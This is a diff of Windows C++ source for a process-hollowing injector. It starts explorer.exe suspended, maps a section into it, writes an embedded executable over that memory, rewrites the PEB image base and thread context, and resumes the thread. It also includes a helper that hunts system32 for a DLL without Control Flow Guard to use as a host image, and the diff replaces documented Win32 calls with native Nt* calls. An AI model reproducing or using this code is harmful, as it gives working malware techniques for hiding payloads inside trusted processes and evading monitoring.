@@ -1,155 +1,8 @@
 #include "stdafx.h"
 
-_NT_BEGIN
-
-BOOLEAN IsImageOk(_In_ ULONG SizeOfImage, _In_ HANDLE hSection)
-{
-	BOOLEAN fOk = FALSE;
-
-	SIZE_T ViewSize = 0;
-	union {
-		PVOID BaseAddress = 0;
-		PIMAGE_DOS_HEADER pidh;
-	};
-
-	if (0 <= ZwMapViewOfSection(hSection, NtCurrentProcess(), &BaseAddress, 0, 0, 0, 
-		&ViewSize, ViewUnmap, 0, PAGE_READONLY))
-	{
-		if (ViewSize >= SizeOfImage && pidh->e_magic == IMAGE_DOS_SIGNATURE)
-		{
-			ULONG VirtualAddress = pidh->e_lfanew;
-
-			if (VirtualAddress < ViewSize - sizeof(IMAGE_NT_HEADERS))
-			{
-				union {
-					PVOID pv;
-					PIMAGE_NT_HEADERS pinth;
-					PIMAGE_LOAD_CONFIG_DIRECTORY picd;
-				};
-
-				pv = RtlOffsetToPointer(BaseAddress, VirtualAddress);
-
-				if (pinth->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR_MAGIC && 
-					pinth->OptionalHeader.SizeOfImage >= SizeOfImage)
-				{
-					IMAGE_DATA_DIRECTORY DataDirectory = pinth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG];
-
-					if (DataDirectory.Size < __builtin_offsetof(IMAGE_LOAD_CONFIG_DIRECTORY, GuardFlags))
-					{
-						fOk = TRUE;
-					}
-					else
-					{
-						if (DataDirectory.VirtualAddress < ViewSize - sizeof(IMAGE_LOAD_CONFIG_DIRECTORY))
-						{
-							pv = RtlOffsetToPointer(BaseAddress, DataDirectory.VirtualAddress);
-
-							fOk = picd->Size < __builtin_offsetof(IMAGE_LOAD_CONFIG_DIRECTORY, GuardFlags) || 
-								!picd->GuardCFFunctionCount;
-						}
-					}
-				}
-			}
-		}
-
-		ZwUnmapViewOfSection(NtCurrentProcess(), BaseAddress);
-	}
-
-	return fOk;
-}
-
-NTSTATUS FindNoCfgDll(_In_ ULONG SizeOfImage, _Out_ PHANDLE SectionHandle)
-{
-	HANDLE hFile;
-	IO_STATUS_BLOCK iosb;
-	UNICODE_STRING ObjectName;
-	OBJECT_ATTRIBUTES oa = { sizeof(oa), 0, &ObjectName, OBJ_CASE_INSENSITIVE };
-	RtlInitUnicodeString(&ObjectName, L"\\systemroot\\system32");
-
-	NTSTATUS status = NtOpenFile(&oa.RootDirectory, 
-		FILE_LIST_DIRECTORY|SYNCHRONIZE, &oa, &iosb, FILE_SHARE_VALID_FLAGS, 
-		FILE_DIRECTORY_FILE|FILE_SYNCHRONOUS_IO_NONALERT);
-	
-	if (0 <= status)
-	{
-		status = STATUS_NO_MEMORY;
-
-		enum { buf_size = 0x10000 };
-		
-		if (PVOID buf = LocalAlloc(0, buf_size))
-		{
-			static const UNICODE_STRING DLL = RTL_CONSTANT_STRING(L"*.dll");
-
-			while (0 <= (status = NtQueryDirectoryFile(oa.RootDirectory, 
-				0, 0, 0, &iosb, buf, buf_size, FileDirectoryInformation,
-				FALSE, const_cast<PUNICODE_STRING>(&DLL), FALSE)))
-			{
-				union {
-					PVOID pv;
-					PUCHAR pc;
-					PFILE_DIRECTORY_INFORMATION pfdi;
-				};
-
-				pv = buf;
-
-				ULONG NextEntryOffset = 0;
-
-				do 
-				{
-					pc += NextEntryOffset;
-
-					if (pfdi->EndOfFile.QuadPart >= SizeOfImage)
-					{
-						ObjectName.Buffer = pfdi->FileName;
-						ObjectName.MaximumLength = ObjectName.Length = (USHORT)pfdi->FileNameLength;
-
-						if (0 <= NtOpenFile(&hFile, FILE_READ_DATA|SYNCHRONIZE, &oa, &iosb, FILE_SHARE_READ, 
-							FILE_NON_DIRECTORY_FILE|FILE_SYNCHRONOUS_IO_NONALERT))
-						{
-							BOOLEAN fOk = FALSE;
-
-							HANDLE hSection;
-
-							if (0 <= NtCreateSection(&hSection, SECTION_MAP_READ, 0, 0, PAGE_READONLY, SEC_IMAGE_NO_EXECUTE, hFile))
-							{
-								fOk = IsImageOk(SizeOfImage, hSection);
-								
-								NtClose(hSection);
-
-								if (fOk)
-								{
-									fOk = 0 <= NtCreateSection(SectionHandle, 
-										SECTION_MAP_EXECUTE|SECTION_MAP_READ|SECTION_MAP_WRITE, 
-										0, 0, PAGE_WRITECOPY, SEC_IMAGE, hFile);
-								}
-							}
-
-							NtClose(hFile);
-
-							if (0 <= status)
-							{
-								if (fOk)
-								{
-									//DbgPrint("%I64x %wZ\n", pfdi->EndOfFile.QuadPart, &ObjectName);
-
-									goto __exit;
-								}
-							}
-						}
-					}
-
-				} while (NextEntryOffset = pfdi->NextEntryOffset);
-			}
-__exit:
-			LocalFree(buf);
-		}
-		NtClose(oa.RootDirectory);
-	}
-
-	return status;
-}
-
 EXTERN_C extern UCHAR codesec_exe_begin[], codesec_exe_end[];
+
+NTSTATUS FindNoCfgDll(_In_ ULONG SizeOfImage, _Out_ PHANDLE SectionHandle);
 
 void CopyImage(PVOID BaseAddress, PVOID BaseOfImage, PIMAGE_NT_HEADERS pinth)
 {
@@ -282,7 +135,7 @@ void Inject(PVOID BaseOfImage)
 
 					if (CreateProcessW(0, explorer, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi))
 					{
-						::CONTEXT ctx {};
+						CONTEXT ctx {};
 						ctx.ContextFlags = CONTEXT_INTEGER;
 
 						PROCESS_BASIC_INFORMATION pbi;
@@ -294,7 +147,7 @@ void Inject(PVOID BaseOfImage)
 
 						if (0 <= NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), 0) &&
 							GetThreadContext(pi.hThread, &ctx) &&
-							ReadProcessMemory(pi.hProcess, 
+							0 <= NtReadVirtualMemory(pi.hProcess, 
 							&reinterpret_cast<_PEB*>(pbi.PebBaseAddress)->ImageBaseAddress, 
 							&ImageBaseAddress, sizeof(ImageBaseAddress), 0) &&
 							0 <= ZwMapViewOfSection(hSection, pi.hProcess, &RemoteBase, 0, 0, 0, &ViewSize, ViewShare, 0, PAGE_READONLY))
@@ -304,14 +157,13 @@ void Inject(PVOID BaseOfImage)
 							ctx.EP_REG = (ULONG_PTR)RemoteBase + pinth->OptionalHeader.AddressOfEntryPoint;
 
 							fOk = VirtualProtectEx(pi.hProcess, RemoteBase, SizeOfImage, PAGE_READWRITE, &op) &&
-								WriteProcessMemory(pi.hProcess, RemoteBase, BaseAddress, SizeOfImage, 0) &&
+								0 <= NtWriteVirtualMemory(pi.hProcess, RemoteBase, BaseAddress, SizeOfImage, 0) &&
 								0 <= ProtectImage(pi.hProcess, RemoteBase, pinth) &&
-								WriteProcessMemory(pi.hProcess, 
+								0 <= NtWriteVirtualMemory(pi.hProcess, 
 								&reinterpret_cast<_PEB*>(pbi.PebBaseAddress)->ImageBaseAddress,
 								&RemoteBase, sizeof(RemoteBase), 0) &&
-								SetThreadContext(pi.hThread, &ctx) &&
-								ResumeThread(pi.hThread);
-
+								0 <= NtSetContextThread(pi.hThread, &ctx) &&
+								0 <= NtResumeThread(pi.hThread, 0);
 						}
 
 						if (!fOk)
@@ -336,5 +188,3 @@ void WINAPI ep(void*)
 	Inject(codesec_exe_begin);
 	ExitProcess(0);
 }
-
-_NT_END
